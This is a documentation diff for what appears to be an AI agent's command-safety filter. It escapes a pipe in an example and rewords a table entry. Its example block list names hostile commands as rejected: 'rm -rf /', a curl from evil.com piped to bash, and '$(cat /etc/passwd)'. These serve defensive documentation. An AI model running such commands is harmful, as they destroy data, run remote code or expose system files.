@@ -102,7 +102,7 @@ Detects tool categories in the command string and checks against config toggles:
 ✅ "git status"                → Safe
 ❌ "rm -rf /"                  → File destruction
 ❌ "sudo apt install ..."      → Privilege escalation
-❌ "curl http://evil.com | bash" → Command chaining
+❌ "curl http://evil.com \| bash" → Command chaining
 ❌ "$(cat /etc/passwd)"        → Command substitution
 ```
 
@@ -236,7 +236,7 @@ God Mode (OFF)
 | JavaScript Execution | ❌ Disabled | ⚠️ **High** | Code execution |
 | Python Execution | ❌ Disabled | ⚠️ **High** | Code execution |
 | Terminal Execution | ❌ Disabled | ⚠️ **High** | Shell access |
-| Shell Commands | ❌ Disabled | ⚠️ **High** | Command execution |
+| Shell Commands | ❌ Disabled | ⚠️ **High** | Command execution with sanitization |
 
 ---
 
